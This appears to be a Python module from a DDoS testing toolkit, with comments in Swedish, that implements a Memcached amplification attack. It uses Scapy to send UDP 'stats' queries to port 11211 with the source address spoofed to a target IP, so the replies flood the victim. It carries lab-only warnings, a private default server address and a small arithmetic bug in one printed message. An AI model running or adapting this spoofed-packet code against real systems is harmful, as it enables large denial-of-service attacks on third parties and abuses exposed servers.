"""
Memcached Amplification Attack
EXTREMT kraftfull amplification (10,000x - 51,000x!)
"""
from scapy.all import IP, UDP, Raw
import time
from .base_attack import BaseAttack
from utils.network_utils import generate_random_port


class MemcachedAmplificationAttack(BaseAttack):
    """Memcached Amplification - EXTREMT kraftfull (51,000x!)"""

    def get_attack_name(self):
        return "Memcached Amplification"

    def execute(self, count=100, memcached_servers=None):
        """
        Kör Memcached amplification attack
        memcached_servers: Lista med osäkrade Memcached-servrar
        """
        if memcached_servers is None:
            # MÅSTE vara egna testservrar i labb!
            memcached_servers = [
                "192.168.1.200"  # Egen Memcached-server i labbet
            ]

        self.print_header("Memcached Amplification Attack", port=11211, count=count)

        print("[*] Memcached Amplification - DEN MEST KRAFTFULLA AMPLIFICATION-ATTACKEN")
        print(f"[*] Använder {len(memcached_servers)} Memcached-servrar")
        print("[*] Förväntad amplifikation: 10,000x - 51,000x (!!!)")
        print("[!] EXTREM VARNING: Kan generera MASSIV trafik!")

        self.start_time = time.time()
        self.packets_sent = 0

        # Memcached stats command (returnerar stora svar)
        memcached_command = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'

        for i in range(count):
            memcached_server = memcached_servers[i % len(memcached_servers)]
            fake_sport = generate_random_port()

            # Source IP spoofad till target
            payload = memcached_command + f"[{self.custom_message}_MEMCACHED_{i + 1}]".encode()

            packet = IP(src=self.target_ip, dst=memcached_server) / \
                     UDP(sport=fake_sport, dport=11211) / \
                     Raw(load=payload)

            self.send_packet(packet)

            if (i + 1) % 20 == 0:  # Mindre frequent reporting pga kraftfullhet
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[+] Memcached: {i + 1}/{count} queries ({pps:.1f} pps)")
                print(f"    ⚠️  VARNING: Kan generera {i + 1 * 51000} gånger mer trafik till target!")

        self.log_attack("MEMCACHED_AMPLIFICATION",
                        f"{count} stats queries, target: {self.target_ip}, EXTREME amplification!")
        self.print_summary()

        print("\n[!] ⚠️  KRITISK VARNING ⚠️")
        print("[!] 15-byte query → 750 KB respons (51,000x amplification!)")
        print("[!] Används i världens största DDoS-attacker (1.3+ Tbps)")
        print("[!] ANVÄND ENDAST I ISOLERAT LABB!")

